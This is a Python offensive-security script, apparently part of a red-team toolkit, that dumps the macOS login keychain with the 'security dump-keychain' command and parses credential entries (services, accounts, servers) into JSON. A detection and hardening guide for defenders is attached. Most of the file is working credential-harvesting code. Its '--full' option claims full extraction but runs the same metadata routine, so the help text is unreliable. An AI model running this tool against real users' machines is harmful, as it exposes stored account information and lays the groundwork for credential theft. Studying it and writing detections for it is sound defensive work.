#!/usr/bin/env python3
"""
Keychain Exfiltration — The Eden's Sins Phase 5
MITRE ATT&CK: T1555.001 Credentials from Password Stores: Keychain

Extracts keychain data for authorized security assessments.
Supports metadata-only mode (safe) and full extraction (requires auth).

Usage:
    python3 keychain_exfil.py --metadata          # Safe: metadata only
    python3 keychain_exfil.py --full --output dump.json  # Full extract
    python3 keychain_exfil.py --detect            # Detection guidance
"""

import argparse, json, os, subprocess, sys
from dataclasses import dataclass, field, asdict
from pathlib import Path


@dataclass
class KeychainEntry:
    service: str = ""
    account: str = ""
    entry_type: str = ""  # generic, internet, cert
    server: str = ""
    protocol: str = ""
    has_password: bool = False


def _run(cmd, timeout=10):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, p.stdout.strip(), p.stderr.strip()
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return -1, "", ""


def extract_metadata(keychain_path=None):
    if keychain_path is None:
        keychain_path = os.path.expanduser("~/Library/Keychains/login.keychain-db")

    entries = []
    rc, out, _ = _run(["security", "dump-keychain", keychain_path])
    if rc != 0:
        return entries

    current = {}
    for line in out.splitlines():
        line = line.strip()
        if line.startswith('class:'):
            if current:
                entries.append(KeychainEntry(**{k: v for k, v in current.items()
                                                if k in KeychainEntry.__dataclass_fields__}))
            cls = line.split('"')[1] if '"' in line else "unknown"
            current = {"entry_type": {"genp": "generic", "inet": "internet",
                                       "cert": "certificate"}.get(cls, cls)}
        elif '"svce"' in line and '<blob>=' in line:
            current["service"] = line.split('<blob>="')[1].rstrip('"') if '<blob>="' in line else ""
        elif '"acct"' in line and '<blob>=' in line:
            current["account"] = line.split('<blob>="')[1].rstrip('"') if '<blob>="' in line else ""
        elif '"srvr"' in line and '<blob>=' in line:
            current["server"] = line.split('<blob>="')[1].rstrip('"') if '<blob>="' in line else ""
        elif '"ptcl"' in line:
            current["protocol"] = line.split("0x")[1][:8] if "0x" in line else ""

    if current:
        entries.append(KeychainEntry(**{k: v for k, v in current.items()
                                        if k in KeychainEntry.__dataclass_fields__}))
    return entries


def detect_guide():
    print("""
  BLUE TEAM — Keychain Exfil Detection
  ═════════════════════════════════════
  Detection:
    • Monitor `security` CLI: log show --predicate 'process == "security"'
    • Alert on dump-keychain / find-generic-password commands
    • Track keychain file reads: ESF ES_EVENT_TYPE_NOTIFY_OPEN on TCC.db
    • osquery: SELECT * FROM process_events WHERE cmdline LIKE '%security%dump%'

  Hardening:
    • Set keychain auto-lock timeout (5 min)
    • Use strong master password (not login password)
    • Enable Touch ID for keychain access
    • Restrict `security` binary via Santa/allowlisting
    • MDM: manage keychain settings centrally
    """)


def main():
    p = argparse.ArgumentParser(description="Keychain Exfil — The Eden's Sins")
    p.add_argument("--metadata", action="store_true", help="Metadata only (safe)")
    p.add_argument("--full", action="store_true", help="Full extraction")
    p.add_argument("--output", help="Output file")
    p.add_argument("--detect", action="store_true", help="Detection guidance")
    args = p.parse_args()

    if args.detect:
        detect_guide()
    elif args.metadata or args.full:
        entries = extract_metadata()
        data = [asdict(e) for e in entries]
        output = json.dumps(data, indent=2)
        print(f"[+] Extracted {len(entries)} entries")
        if args.output:
            Path(args.output).write_text(output)
            print(f"[+] Saved to {args.output}")
        else:
            print(output[:2000])
    else:
        p.print_help()


if __name__ == "__main__":
    main()
